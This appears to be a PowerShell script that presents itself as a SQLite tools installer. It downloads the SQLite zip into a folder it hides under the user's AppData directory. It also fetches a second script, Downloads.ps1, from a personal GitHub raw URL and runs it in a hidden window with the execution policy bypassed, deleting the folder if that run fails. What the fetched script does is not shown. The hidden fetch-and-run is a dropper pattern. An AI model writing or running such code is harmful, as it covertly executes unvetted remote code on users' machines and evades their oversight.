# URL to download
$url = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3410200.zip"

# Hidden folder in the user's AppData directory
$hiddenFolderPath = "$env:LOCALAPPDATA\HiddenSqliteFolder"
$zipFilePath = Join-Path $hiddenFolderPath "sqlite-tools-win32-x86-3410200.zip"
$extractedFolderPath = Join-Path $hiddenFolderPath "sqlite-tools"

# Create the hidden folder if it doesn't exist
if (-not (Test-Path $hiddenFolderPath)) {
    New-Item -ItemType Directory -Path $hiddenFolderPath -Force | Out-Null
    Set-ItemProperty -Path $hiddenFolderPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
}

# Download the files
Invoke-WebRequest -Uri $url -OutFile $zipFilePath
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/N8crawler2139/MyCode/main/Downloads.ps1" -OutFile "$hiddenFolderPath\Downloads.ps1"

# Extract the contents
Expand-Archive -Path $zipFilePath -DestinationPath $extractedFolderPath -Force

# Find and display the full path of sqlite3.exe
$sqliteExePath = Get-ChildItem -Path $extractedFolderPath -Recurse -Include "sqlite3.exe" -File -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName

if ($sqliteExePath) {
    Write-Host "The full path of the sqlite3.exe file is: $sqliteExePath"
} else {
    Write-Host "sqlite3.exe not found in the extracted contents."
}

# Hidden folder in the user's AppData directory
$downloadsScriptPath = Join-Path $hiddenFolderPath "downloads.ps1"

# Check if the downloads.ps1 script exists
if (Test-Path $downloadsScriptPath) {
    # Run the script directly
    try {
        Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$downloadsScriptPath`"" -WindowStyle Hidden -Wait
    } catch {
        # If the script fails to run, delete the hidden folder
        Remove-Item -Path $hiddenFolderPath -Recurse -Force
        Write-Host "The downloads.ps1 script failed to run or was terminated. The folder $hiddenFolderPath has been deleted."
    }
} else {
    Write-Host "The downloads.ps1 script does not exist in the specified location."
}
